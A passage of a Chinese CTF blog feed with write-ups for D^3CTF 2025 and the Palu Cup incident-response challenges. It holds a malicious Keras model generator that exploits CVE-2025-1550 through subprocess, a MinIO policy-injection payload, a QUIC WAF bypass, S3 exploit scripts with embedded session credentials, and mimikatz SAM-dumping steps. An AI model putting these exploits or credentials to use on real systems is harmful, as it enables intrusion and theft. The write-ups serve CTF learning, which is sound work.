PEM格式的RSA公钥字符串 \u0026#34;\u0026#34;\u0026#34; self.public_key = self._load_public_key(public_key_pem) @staticmethod def _load_public_key(public_key_pem: str): \u0026#34;\u0026#34;\u0026#34;加载PEM格式的公钥\u0026#34;\u0026#34;\u0026#34; try: return serialization.load_pem_public_key( public_key_pem.encode(), backend=default_backend() ) except ValueError as e: raise ValueError(\u0026#34;无效的公钥格式\u0026#34;) from e def encrypt(self, message: str, encoding: str = \u0026#39;utf-8\u0026#39;) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34; RSA加密消息 参数: message: 要加密的原始消息 encoding: 消息编码方式(默认utf-8) 返回: Base64编码的加密结果字符串 \u0026#34;\u0026#34;\u0026#34; try: ciphertext = self.public_key.encrypt( message.encode(encoding), padding.PKCS1v15() ) return base64.b64encode(ciphertext).decode(\u0026#39;utf-8\u0026#39;) except Exception as e: raise RuntimeError(f\u0026#34;加密失败: {str(e)}\u0026#34;) def main(): # RSA公钥 PUBLIC_KEY_PEM = \u0026#34;\u0026#34;\u0026#34; -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn 99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s TwIDAQAB -----END PUBLIC KEY----- \u0026#34;\u0026#34;\u0026#34; # 要加密的JSON数据 message = \u0026#39;{\u0026#34;action\u0026#34;:\u0026#34;getflag\u0026#34;}\u0026#39; try: # 创建加密器实例 encryptor = RSAEncryptor(PUBLIC_KEY_PEM) # 执行加密 encrypted_data = encryptor.encrypt(message) print(\u0026#34;加密结果:\u0026#34;) print(encrypted_data) except Exception as e: print(f\u0026#34;错误: {str(e)}\u0026#34;) return 1 return 0 if __name__ == \u0026#34;__main__\u0026#34;: import sys sys.exit(main()) 请求体\n1 {\u0026#34;data\u0026#34;: \u0026#34;DDbony24lOqINuerJvtjH/+0I2AsdrKWwFQlp24oZ6P/DzFUxp5r/++TdZpItijaDLVJwG5E3Cy6CSFYQhq/3sB6S9QOGQ2y3i1U5aJQ2N+sU/WpFg9D4eY9YR85T0TeKwV8wIHQPQu8a4YAYcvEY7/2gs0AU+ud8f+j+uVvlj0piv5phItu0HjRPQtX7Q1p6RjoE92M6MsRJVK9Db7MSTVRL0LwczSUueGHLi8fArA8lwGcfGsl2/KKpe8KtmorFTndkkiuV2QoAC1P+r3u7vH5GfmWnyBl+xrC3ZccIC4CnVptvy32DNJ1GlZWHFh7PtKZ7ok72tZcEZoyKC9s8w==\u0026#34;} md5得到X-Sign\n1 85833e20b047b21daa90eee6c3c602b3 ","date":"2025-06-08T00:00:00Z","image":"https://0d000721999.github.io/p/2025%E9%B8%BF%E8%92%99ctfwp/1.jpg","permalink":"https://0d000721999.github.io/p/2025%E9%B8%BF%E8%92%99ctfwp/","title":"2025鸿蒙ctfwp"},{"content":"2025D^3CTF复现 d3model app.py看到keras，然后搜索相关漏洞，找到Keras \u0026lt; 3.9 RCE漏洞： CVE-2025-1550\n找到博客https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models\n看dockerfile\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 FROM python:3.10-slim COPY app.py /app/app.py COPY requirements.txt /app/requirements.txt COPY index.html /app/index.html WORKDIR /app RUN pip install --no-cache-dir -r requirements.txt ENV FLAG=${FLAG:-flag{test}} EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] flag在环境变量，而且index.html可写\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import zipfile import json import os from keras.models import Sequential from keras.layers import Dense import numpy as np model_name=\u0026#34;model.keras\u0026#34; x_train = np.random.rand(100, 28*28) y_train = np.random.rand(100) model = Sequential([Dense(1, activation=\u0026#39;linear\u0026#39;, input_dim=28*28)]) model.compile(optimizer=\u0026#39;adam\u0026#39;, loss=\u0026#39;mse\u0026#39;) model.fit(x_train, y_train, epochs=5) model.save(model_name) with zipfile.ZipFile(model_name,\u0026#34;r\u0026#34;) as f: config=json.loads(f.read(\u0026#34;config.json\u0026#34;).decode()) config[\u0026#34;config\u0026#34;][\u0026#34;layers\u0026#34;][0][\u0026#34;module\u0026#34;]=\u0026#34;keras.models\u0026#34; config[\u0026#34;config\u0026#34;][\u0026#34;layers\u0026#34;][0][\u0026#34;class_name\u0026#34;]=\u0026#34;Model\u0026#34; config[\u0026#34;config\u0026#34;][\u0026#34;layers\u0026#34;][0][\u0026#34;config\u0026#34;]={ \u0026#34;name\u0026#34;:\u0026#34;mvlttt\u0026#34;, \u0026#34;layers\u0026#34;:[ { \u0026#34;name\u0026#34;:\u0026#34;mvlttt\u0026#34;, \u0026#34;class_name\u0026#34;:\u0026#34;function\u0026#34;, \u0026#34;config\u0026#34;:\u0026#34;Popen\u0026#34;, \u0026#34;module\u0026#34;: \u0026#34;subprocess\u0026#34;, \u0026#34;inbound_nodes\u0026#34;:[{\u0026#34;args\u0026#34;:[[\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;env \u0026gt; index.html\u0026#34;]],\u0026#34;kwargs\u0026#34;:{\u0026#34;bufsize\u0026#34;:-1}}] }], \u0026#34;input_layers\u0026#34;:[[\u0026#34;mvlttt\u0026#34;, 0, 0]], \u0026#34;output_layers\u0026#34;:[[\u0026#34;mvlttt\u0026#34;, 0, 0]] } with zipfile.ZipFile(model_name, \u0026#39;r\u0026#39;) as zip_read: with zipfile.ZipFile(f\u0026#34;tmp.{model_name}\u0026#34;, \u0026#39;w\u0026#39;) as zip_write: for item in zip_read.infolist(): if item.filename != \u0026#34;config.json\u0026#34;: zip_write.writestr(item, zip_read.read(item.filename)) os.remove(model_name) os.rename(f\u0026#34;tmp.{model_name}\u0026#34;,model_name) with zipfile.ZipFile(model_name,\u0026#34;a\u0026#34;) as zf: zf.writestr(\u0026#34;config.json\u0026#34;,json.dumps(config)) print(\u0026#34;[+] Malicious model ready\u0026#34;) 生成keras文件上传，访问主页面就得到flag\ntidy quic mian.go里面看到有waf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func (w *wrap) Read(p []byte) (int, error) { n, err := w.ReadCloser.Read(p) if err != nil \u0026amp;\u0026amp; !errors.Is(err, io.EOF) { return n, err } for i := 0; i \u0026lt; n; i++ { if p[i] == w.ban[w.idx] { w.idx++ if w.idx == len(w.ban) { return n, ErrWAF } } else { w.idx = 0 } } return n, err } 不能传入连续的flag，但是要输入I want flag才能输出flag\n注意到，当存在 ContentLength 的时候，就会从 BufferPool 里面拿一个对应长度的 buffer 出来用。并且读取 body 内容的时候，没有清空原有 buffer，也没有验证读取内容是否达到 ContentLength 个 bytes。这就导致如果 ContentLength 比 body 长，buffer 后面的 bytes 就会有之前 POST 的内容，拼接后的内容不会被 WAF 检测。\n可以用curl来分批传，利用ContentLength这个缺陷，来拼接出I want flag\n问ai一直连不上，然后用这条连上了\n1 curl --http3-only https://35.241.98.126:30859/ -X POST -H \u0026#34;Content-Type: text/plain\u0026#34; --data-raw \u0026#34;I want flag \u0026#34; -k -v 理论上来说\n1 2 3 4 5 6 curl --http3 https://35.241.98.126:30859/ \\ -X POST \\ -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ -H \u0026#34;Content-Length: 11\u0026#34; \\ --data-binary \u0026#34;I want \u0026#34; \\ -k -v 然后\n1 2 3 4 5 6 curl --http3 https://35.241.98.126:30859/ \\ -X POST \\ -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ -H \u0026#34;Content-Length: 11\u0026#34; \\ --data-binary \u0026#34; flag\u0026#34; \\ -k -v 是能拼接成功的\n用S1uM4i✌的思路\n先提交 I want __ag 再提交 I want fl（两者的 Content-Length 都设置成 11），后面那个 POST 就(大概率)会拼成 I want flag。\n他们的exp\n1 2 3 4 5 6 7 8 # 改编自 https://github.com/aiortc/aioquic/blob/main/examples/http3_client.py configuration = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN, verify_mode=ssl.CERT_NONE) async with connect(\u0026#39;127.0.0.1\u0026#39;, \u0026#39;8080\u0026#39;, configuration=configuration, create_protocol=HttpClient) as client: await client.post(\u0026#39;https://127.0.0.1:8080/\u0026#39;, data=b\u0026#39;I want __ag\u0026#39;, headers={\u0026#39;content-length\u0026#39;: \u0026#39;11\u0026#39;}) events = await client.post(\u0026#39;https://127.0.0.1:8080/\u0026#39;, data=b\u0026#39;I want fl\u0026#39;, headers={\u0026#39;content-length\u0026#39;: \u0026#39;11\u0026#39;}) for event in events: if isinstance(event, DataReceived): print(f\u0026#34;Data received: {event.data}\u0026#34;) 最后我是这样成功的\n1 2 3 4 curl --http3 -X POST \\ https://35.241.98.126:30859 \\ -H \u0026#34;content-length: 11\u0026#34; \\ -d \u0026#34;I want __ag\u0026#34; -k -v --output - 然后一直\n1 2 3 4 curl --http3 -X POST \\ https://35.241.98.126:30859 \\ -H \u0026#34;content-length: 11\u0026#34; \\ -d \u0026#34;I want fl\u0026#34; -k -v --output - d3rpg-signin 正常玩思路是这样的\n进房间问那个鸽鸽npc,说我是musc手，拿到flag1\n先从外面npc那里拿到地下室密码，选第二个进地下室\n在这里买第三个可以获取1RMB,然后得到flag2，买第一个可以去外面水井拿寄存器和内存值\n这里就有一个办法拿到全的flag，得用CE该金币值，买255的，下面再说这种办法\n然后来到二层，村长提示\n这里暗示摩斯密码\n地板上的阴影补兑，没有那个三角形的视为.,然后三角形视为-,解密得到\n1 fVzByMWQ= 最后一步就是外面的水井了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 寄存器 RAX=0000000000000000 RBX=000000329590FAB0 RCX=00007FFE9BEC2414 RDX=0000000000000000 RBP=0000000000000000 RSP=000000329590F590 RSI=0000003295B85000 RDI=0000000000000001 R8-R15=.... RIP=00007FFE9BE84DDA 内存值 [RBP-0x10]0x00007FF692AE9841 [RBP-0x18]0x000002025F0A2490 [RBP-0x20]0x0000007773506D49 [RBP-0x28]0x11100F0E0D0C0B0A 发现0x20这条的16进制解密有东西\n是“ImPsw”按小端序排列的值，所以水井密码是ImPsw，打开水井得到flag0\n1 VzNsYz 接下来用CE改RMB值直接买flag,扫描增加的数值，然后扫描不变的数值，反复查找\n就能找到我们RMB的地址，发现增加1RMB，值增加2\n我们要买那个128的，直接增加数组到255\n购买得到flag\n还有一种办法，用Mtool扫描所有字符串\n导出待翻译的原文\n这里就有flag\nd3invitation 跟着这篇学习https://forum.butian.net/share/4340\n存储桶应用安全问题\n这里用RAM策略注入\n1 {\u0026#34;object_name\u0026#34;: \u0026#34;*\\\u0026#34;]},{\\\u0026#34;Effect\\\u0026#34;:\\\u0026#34;Allow\\\u0026#34;,\\\u0026#34;Action\\\u0026#34;:[\\\u0026#34;s3:*\\\u0026#34;],\\\u0026#34;Resource\\\u0026#34;:[\\\u0026#34;arn:aws:s3:::*\u0026#34;} 这样可以读到所有桶\n接下来就是连接minio服务器，访问会得到两个桶\n访问flag桶就得到flag\nS1uM4i✌的exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 import hmac import hashlib import datetime import urllib.parse import requests #更改为自己通过/api/genSTSCreds获取的 ACCESS_KEY = \u0026#34;PTKZVLPN95ORZHJTBK0D\u0026#34; SECRET_KEY = \u0026#34;d9QeMbVCgiMUE+EJ1eHfZIZlll+f6qmoL42HQTif\u0026#34; SESSION_TOKEN = \u0026#34;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJQVEtaVkxQTjk1T1JaSEpUQkswRCIsImV4cCI6MTc0ODYyODI3MSwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2SWwxOUxIc2lSV1ptWldOMElqb2lRV3hzYjNjaUxDSkJZM1JwYjI0aU9sc2ljek02S2lKZExDSlNaWE52ZFhKalpTSTZXeUpoY200NllYZHpPbk16T2pvNktpSmRmVjE5In0.wgYw9JJXuiACRXaZmIh2i-GSVUSEUW1kNLkRenMPpntr4r9DasxvArw0llt1eROVuTiOFR9Z3SSI0xpDzDDlwQ\u0026#34; MINIO_ENDPOINT = \u0026#34;http://34.150.83.54:30761\u0026#34; def sign(key, msg): return hmac.new(key, msg.encode(\u0026#39;utf-8\u0026#39;), hashlib.sha256).digest() def get_signature_key(key, date_stamp, region_name, service_name): k_date = sign((\u0026#39;AWS4\u0026#39; + key).encode(\u0026#39;utf-8\u0026#39;), date_stamp) k_region = sign(k_date, region_name) k_service = sign(k_region, service_name) return sign(k_service, \u0026#39;aws4_request\u0026#39;) def generate_aws_headers(method, path): # 获取时间和主机信息 now = datetime.datetime.utcnow() amz_date = now.strftime(\u0026#39;%Y%m%dT%H%M%SZ\u0026#39;) date_stamp = now.strftime(\u0026#39;%Y%m%d\u0026#39;) host = MINIO_ENDPOINT.split(\u0026#39;//\u0026#39;)[1].split(\u0026#39;/\u0026#39;)[0] # 正确获取主机:端口 # 规范URI编码 (关键修复) canonical_uri = \u0026#39;/\u0026#39; + \u0026#39;/\u0026#39;.join( urllib.parse.quote(segment, safe=\u0026#39;\u0026#39;) for segment in path.split(\u0026#39;/\u0026#39;) ) # 规范查询字符串 (本例中为空) canonical_querystring = \u0026#34;\u0026#34; # 规范头部 (按字母顺序排序) canonical_headers = f\u0026#34;host:{host}\\n\u0026#34; canonical_headers += f\u0026#34;x-amz-date:{amz_date}\\n\u0026#34; canonical_headers += f\u0026#34;x-amz-security-token:{SESSION_TOKEN}\\n\u0026#34; # 包含在签名中 signed_headers = \u0026#34;host;x-amz-date;x-amz-security-token\u0026#34; # 按字母顺序 # 规范请求体哈希 (GET请求为空) payload_hash = hashlib.sha256(b\u0026#39;\u0026#39;).hexdigest() # 构建规范请求 canonical_request = ( f\u0026#34;{method}\\n\u0026#34; f\u0026#34;{canonical_uri}\\n\u0026#34; f\u0026#34;{canonical_querystring}\\n\u0026#34; f\u0026#34;{canonical_headers}\\n\u0026#34; f\u0026#34;{signed_headers}\\n\u0026#34; f\u0026#34;{payload_hash}\u0026#34; ) # 创建待签名字符串 algorithm = \u0026#34;AWS4-HMAC-SHA256\u0026#34; credential_scope = f\u0026#34;{date_stamp}/us-east-1/s3/aws4_request\u0026#34; string_to_sign = ( f\u0026#34;{algorithm}\\n\u0026#34; f\u0026#34;{amz_date}\\n\u0026#34; f\u0026#34;{credential_scope}\\n\u0026#34; f\u0026#34;{hashlib.sha256(canonical_request.encode(\u0026#39;utf-8\u0026#39;)).hexdigest()}\u0026#34; ) # 计算签名 signing_key = get_signature_key(SECRET_KEY, date_stamp, \u0026#34;us-east-1\u0026#34;, \u0026#34;s3\u0026#34;) signature = hmac.new( signing_key, string_to_sign.encode(\u0026#39;utf-8\u0026#39;), hashlib.sha256 ).hexdigest() # 构建授权头 authorization_header = ( f\u0026#34;{algorithm} Credential={ACCESS_KEY}/{credential_scope}, \u0026#34; f\u0026#34;SignedHeaders={signed_headers}, \u0026#34; f\u0026#34;Signature={signature}\u0026#34; ) return { \u0026#39;Host\u0026#39;: host, \u0026#39;x-amz-date\u0026#39;: amz_date, \u0026#39;x-amz-security-token\u0026#39;: SESSION_TOKEN, \u0026#39;Authorization\u0026#39;: authorization_header } def list_all_buckets(): headers = generate_aws_headers(\u0026#34;GET\u0026#34;, f\u0026#34;/\u0026#34;) url = f\u0026#34;{MINIO_ENDPOINT}/\u0026#34; response = requests.get(url, headers=headers) if response.status_code == 200: print(\u0026#34;[+] 所有存储桶列表:\u0026#34;) print(response.text) return response.text else: print(\u0026#34;[ERROR]\u0026#34;) print(response.text) # 使用示例 if __name__ == \u0026#34;__main__\u0026#34;: headers = generate_aws_headers(\u0026#34;GET\u0026#34;, \u0026#34;flag/flag\u0026#34;) # 发送请求 response = requests.get( f\u0026#34;{MINIO_ENDPOINT}/flag/flag\u0026#34;, headers=headers ) print(response.text) N0wayBack✌的exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 import boto3 from botocore.client import Config from botocore.exceptions import ClientError def list_objects_in_bucket(access_key, secret_key, session_token, endpoint, bucket): session = boto3.session.Session() s3 = session.client( service_name=\u0026#39;s3\u0026#39;, endpoint_url=endpoint, aws_access_key_id=access_key, aws_secret_access_key=secret_key, aws_session_token=session_token, config=Config(signature_version=\u0026#39;s3v4\u0026#39;), region_name=\u0026#39;us-east-1\u0026#39; ) response = s3.list_objects_v2(Bucket=bucket) if\u0026#39;Contents\u0026#39;in response: print(f\u0026#34;桶 \u0026#39;{bucket}\u0026#39; 中的对象列表:\u0026#34;) for obj in response[\u0026#39;Contents\u0026#39;]: print(f\u0026#34; - {obj[\u0026#39;Key\u0026#39;]} (大小: {obj[\u0026#39;Size\u0026#39;]} bytes)\u0026#34;) else: print(f\u0026#34;桶 \u0026#39;{bucket}\u0026#39; 为空或无法获取对象列表。\u0026#34;) def download_flag_file(access_key, secret_key, session_token, endpoint, bucket, object_name, download_path): session = boto3.session.Session() s3 = session.client( service_name=\u0026#39;s3\u0026#39;, endpoint_url=endpoint, aws_access_key_id=access_key, aws_secret_access_key=secret_key, aws_session_token=session_token, config=Config(signature_version=\u0026#39;s3v4\u0026#39;), region_name=\u0026#39;us-east-1\u0026#39; ) try: s3.download_file(bucket, object_name, download_path) print(f\u0026#34;成功下载 {object_name} 到 {download_path}\u0026#34;) except ClientError as e: print(f\u0026#34;下载失败: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: access_key = \u0026#34;7AE3269H28PPXTBYAE3G\u0026#34; secret_key = \u0026#34;BB++8Gr+tSFJCRh4GTa96hN3uu+hkVhyK+OzJCLN\u0026#34; session_token = \u0026#34;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiI3QUUzMjY5SDI4UFBYVEJZQUUzRyIsImV4cCI6MTc0ODg1NTU0NCwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2lvaVhTd2lVbVZ6YjNWeVkyVWlPbHNpWVhKdU9tRjNjenB6TXpvNk9pb2lYWDFkZlE9PSJ9.3ki6R3-IaVCJ8vDg-lLSJrl8A5p-eSkdGH-l1jBsBNgxh2fUrKKk3SjSrcAU7Lw4ZU5uY0n7YtfSakh0sGQ45g\u0026#34; list_objects_in_bucket(access_key,secret_key,session_token,\u0026#34;http://35.241.98.126:32038\u0026#34;,\u0026#34;flag\u0026#34;) 至于连接，用aws连接是这样的\n1 2 3 4 5 vim ~/.aws/credentials [minio] aws_access_key_id = GRO1TWRV8FSZV5OCCVFE aws_secret_access_key = ATk+SFgUfZUT6cUzYdAA4qciMSJK9neo0s0hA02Q aws_session_token = eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJHUk8xVFdSVjhGU1pWNU9DQ1ZGRSIsImV4cCI6MTc0ODY4NTk2NSwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZWMTkifQ.TlzvIuG_zgOGWUgZdhRS92Gloisjt_hezNMd6vz8IJz-4NwcxkwdkrtA6CsX2wNVwVllVr_8oHr8j83COk5Nmg 然后写到自己机器上\n1 aws --profile minio --endpoint-url http://35.241.98.126:30744 s3 cp \u0026#34;s3://flag/flag\u0026#34; /tmp ","date":"2025-06-02T00:00:00Z","image":"https://0d000721999.github.io/p/2025d3ctf%E5%A4%8D%E7%8E%B0/1.jpg","permalink":"https://0d000721999.github.io/p/2025d3ctf%E5%A4%8D%E7%8E%B0/","title":"2025D^3CTF复现"},{"content":"帕鲁杯应急复现 畸形的爱 上次做了6题，现在接着做\n暴力破解开始时间 由于前面那个有docker环境，我们查看docker启动的服务\n1 docker ps 发现phpmyadmin，这个最有可能被暴力破解\n查看\n1 docker logs phpmyadmin 所以flag是\npalu{2025:03:05:58}\nflag2 在flag1文件的最后有一串命令\n1 2 3 4 5 \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;\u0026#34;C:\\Program Files (x86)\\Microsoft\\a.bat\u0026#34;\u0026lt;/Command\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; 查看a.bat\n把他改成txt\n1 2 3 @echo off msg * \u0026#34;王美欣，你知道我有多爱你吗\u0026#34; echo flag2palu{nizhidaowoyouduoainima} flag3 sql这台机子root账号密码就是sql\n进root后\n用mysql连接数据库,byd密码不对\n先无密码启动mysql\n1 sudo mysqld_safe --skip-grant-tables --skip-networking \u0026amp; 1 2 3 UPDATE mysql.user SET authentication_string=PASSWORD(\u0026#39;root\u0026#39;) WHERE User=\u0026#39;root\u0026#39;; FLUSH PRIVILEGES; EXIT; 1 mysql -uroot -p 1 2 3 show databases; show tables; select * from orders; 得到一串base64，然后解码得到flag\n攻击者开放端口3个 第一个就是之前查看那个ip2的时候找到的\nclean.sh里面开放了1133端口\n接下来我们查看定时任务\n1 crontab -l 发现tmp目录下有个r.sh\n查看\n发现反弹shell命令，开放1144端口\n接下来z在那台win10用netstat查看开放端口\n1 netstat 隐藏账户的密码 可以直接传d盾到那台win10上面扫，能扫到后门用户\nwin10还可以用命令查看\n1 net user 但是只看到前面的两个正常账号\n用powershell\n1 Get-LocalUser 发现了后门用户\nsystem$\n然后用mimikatz跑hash\n1 2 reg save hklm\\sam sam.save reg save hklm\\system system.save 然后在 mimikatz 中执行:\n1 2 privilege::debug Isadump::sam /sam:sam.save /system:system.save 然后去MD5解密\n[溯源]flag4 把那个钓鱼的exe拖到ida里面分析，发现黑客的id：n0k4u\n去github上找，他的项目里面有一个qq号\n搜索得到flag\n[溯源]攻击者的邮箱 因为知道id就可以知道邮箱\n1 https://api.github.com/users/\u0026lt;name\u0026gt;/events/public 访问\n1 https://api.github.com/users/n0k4u/events/public 得到邮箱\n应急主线 solar_Linux后门排查 1 2 3 4 5 6 7 题目描述 跳板机疑似被遗留后门,请排查 1、找到可疑进程完整路径 2、找到被横向的服务器IP 3、连接被横向服务器 flag格式为 flag{base64{完整路径}|服务器IP|服务器中flag文本} root:Solar@2025_05_palu! 1 ss -anptu ss看到恶意ip,看到pid为11\nip为49.232.112.164:22\n查看进程\n1 ps -aux |grep 11 完整路径为usr/lib/systemd/systemd-login\n接着ssh连接这个\n1 ssh 49.232.112.164 要root密码，这下是Solar@2025_05_palu!了，换xshell连\n连上直接cat flag\n1 ZX0001S 应急响应2-1 提交堡垒机中留下的flag\n1 grep -r \u0026#34;palu{\u0026#34; /* 或者直接用链接登入\n1 http://192.168.20.100/ 1 palu{2025_qiandao_flag} 应急响应2-2 提交WAF中隐藏的flag\n同样登入waf\n1 https://192.168.20.102:9443/ 在身份认证找到flag\n1 palu{2025_waf} 应急响应2-3 提交Mysql中留下的flag\n直接navicat连接，找到flag\n1 palu{Mysql_@2025} 应急响应2-4 提交攻击者的攻击IP\nwaf雷池查看不是给的拓扑图里面的ip\n1 palu{192.168.20.107} 应急响应2-5 提交攻攻击者最早攻击时间flag格式为palu{xxxx-xx-xx-xx:xx:xx}\n刚刚看雷池已经看到了\n1 palu{2025-05-05-00:04:40} 应急响应2-6 提交web服务泄露的关键文件名\n前面发现那个机子直接用虚拟机看很多条看不到，直接换xshell连了\n查看服务\n1 ps -aux 发现nginx服务，查看他的日志\n/var/log下面没有nginx\n全局找\n直接看第一个，有个safeline\n查看发现一堆日志\n1 palu{key.txt} 应急响应2-7 提交泄露的邮箱地址作为flag进行提交\n访问key.txt\n1 palu{parloo@parloo.com} 应急响应2-8 提交立足点服务器ip地址\n前下看雷池的时候发现的本机的服务器来攻击了,很可疑\n1 palu{192.168.20.108} 应急响应2-9 提交攻击者使用的提权用户密码,flag格式为:palu{username/password}\n由于前面那题知道立足点服务器了，我们可以直接去192.168.20.108对应的服务器查看，也就是 sshServer 这台机子，然后查看\n1 cat /etc/shadow 得到parloo/parloo\n1 palu{parloo/parloo} 应急响应2-10 提交攻击者留下的的文件内容作为flag提交\n这个想到进攻击者留下的账号目录里面看\n1 palu{hi_2025_parloo_is_hack} 应急响应2-11 提交权限维持方法服务的名称\n一般是木马，我们直接查看服务器外联地址\n1 netstat -anplt 或者看恶意进程\n1 ps -aux 发现恶意进程b4b4那个\nps查看他在哪个路径\n1 ps -ef |grep b4b4 这里知道了执行恶意进程的用户pid\n可以查看他执行的system服务\n1 systemctl status 831 1 palu{rootset} 至于他这个程序，其实执行了Restart=always\n应急响应2-12 提交攻击者攻击恶意服务器连接地址作为flag提交\n这个就是上面找到的那个外联地址\n1 palu{47.101.213.153} 应急响应2-13 找到系统中被劫持的程序程序名作为flag提交\n1 ls -alh /usr/bin /bin /usr/sbin /sbin | grep -vE \u0026#39;root | staff |bin\u0026#39; 查看不属于root的程序，\n/bin 基础命令 ls,cp /usr/bin 扩展命令 vim,python /sbin 系统管理命令 ifconfig,reboot /usr/sbin 更多管理命令 sshd,apache 或者\n1 ps -ef 找到\n1 palu{id} 应急响应2-14 找到系统中存在信息泄露的服务运行端口作为flag提交\n这里查看server01,然后探测别的端口\nfscan扫描\n80端口是重要通知\n这里其实可以解决前面提权密码的问题\n然后8081端口也很可疑\n1 palu{8081} 应急响应2-15 提交Parloo公司项目经理的身份证号作为flag提交\n同上可以拿到\n1 palu{310105198512123456} 应急响应2-16 提交存在危险功能的操作系统路径作为flag提交。flag格式为palu{/xxx/xxx}\n扫端口的时候一定也要开mysql那台机子，不然这题扫不到了\n多了一个3000端口，git服务可能会泄露\n进仓库有个mian.go\npackage main import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;html/template\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; ) type Command struct { Input string Output string ExecTime float64 } // 日志记录结构 type CommandLog struct { Timestamp time.Time IP string Command string Output string ExecTime float64 Error string } var logChan = make(chan CommandLog, 100) // 日志通道用于异步记录 func main() { // 启动日志处理协程 go handleLogs() tmpl := template.Must(template.New(\u0026#34;index\u0026#34;).Parse(htmlTemplate)) http.HandleFunc(\u0026#34;/admin/parloo\u0026#34;, func(w http.ResponseWriter, r *http.Request) { if r.Method == \u0026#34;GET\u0026#34; { tmpl.Execute(w, nil) return } // 获取客户端IP clientIP := getClientIP(r) // 处理POST请求 cmdInput := r.FormValue(\u0026#34;cmd\u0026#34;) if cmdInput == \u0026#34;\u0026#34; { http.Error(w, \u0026#34;Command cannot be empty\u0026#34;, http.StatusBadRequest) return } // 创建带有超时的context ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second) defer cancel() start := time.Now() cmd := exec.CommandContext(ctx, \u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, cmdInput) //cmd := exec.CommandContext(ctx, 